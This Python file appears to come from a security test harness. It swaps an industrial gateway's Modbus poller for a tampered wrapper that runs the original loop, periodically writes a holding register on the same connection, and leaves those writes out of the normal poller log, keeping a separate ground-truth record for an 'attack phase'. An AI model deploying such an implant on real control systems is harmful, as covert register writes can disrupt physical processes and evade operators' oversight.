"""Tampered polling loop: the gateway's own poller, plus Modbus writes.

Put in place of /app/poller.py by run.sh, with the original moved to
/app/poller_orig.py, and started with the usual command
(gateway-poller poller.py): same executable, same command line, same
posture. It runs the original loop unchanged, except that every
WRITE_EVERY cycles, after the read, it writes holding register
WRITE_REGISTER on the same Modbus connection. The values count up from
1001, so that every write can be told apart.

The poller log is left as the original writes it: the writes are not in
it. They are recorded, for the run's ground truth only, one line each in
/tmp/modbus-writes.log (UTC time, register, value, outcome, duration),
which run.sh copies out at the end of the attack phase.
"""

import datetime
import os
import time

import poller_orig as poller

WRITE_REGISTER = int(os.environ.get("WRITE_REGISTER", "1"))
WRITE_EVERY = int(os.environ.get("WRITE_EVERY", "3"))
WRITE_LOG = "/tmp/modbus-writes.log"

original_read_register = poller.read_register
cycle = 0
value = 1000


def utc_now():
    now = datetime.datetime.now(datetime.timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def read_register(client):
    global cycle, value
    reading, err = original_read_register(client)
    cycle += 1
    if err is None and cycle % WRITE_EVERY == 0:
        value += 1
        t, t0 = utc_now(), time.monotonic()
        try:
            wr = client.write_register(WRITE_REGISTER, value, device_id=0)
            result = f"error={wr}" if wr.isError() else "ok"
        except Exception as e:
            result = f"error={e.__class__.__name__}"
        ms = int((time.monotonic() - t0) * 1000)
        with open(WRITE_LOG, "a") as f:
            f.write(f"{t} register={WRITE_REGISTER} value={value} {result} {ms}ms\n")
    return reading, err


poller.read_register = read_register
poller.main()
